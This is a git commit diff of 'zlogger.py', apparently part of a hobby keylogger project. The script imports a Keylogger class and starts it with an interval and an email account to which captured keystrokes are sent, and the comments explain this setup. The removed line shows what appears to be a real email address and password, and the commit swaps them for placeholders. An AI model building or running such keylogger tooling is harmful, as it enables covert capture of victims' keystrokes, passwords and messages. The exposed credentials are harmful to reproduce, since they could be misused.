6e99fe96841bf6c220f70c5f01178d111a8b1266
LOKESHG1234 <63283533+LOKESHG1234@users.noreply.github.com>
2020-08-06 19:08:59 +0530

    Update zlogger.py

--- zlogger.py
+++ zlogger.py
@@ -1,10 +1,9 @@
 #!/usr/bin/env python
 import keylogger
 
-my_keylogger = keylogger.Keylogger(120, "evildiles1235@gmail.com", "Speed_789789789") # we importes the keylogger.py file using import <file name>
+my_keylogger = keylogger.Keylogger(120, "YYYYYYYYY", "XXXXXXXXX") 
 my_keylogger.start()
-
-my_keylogger = keylogger.Keylogger(120, "YYYYYYYYY", "XXXXXXXXX") # we importes the keylogger.py file using import <file name>
+# we importes the keylogger.py file using import <file name>
 # we created a class named Keylogger and made an instance of it
 # YYYYYYYYY- Your email where you want the keystrikes
 # XXXXXXXXX - Email Password so that in send_mail function we can connect to the email on which we want the keystrikes
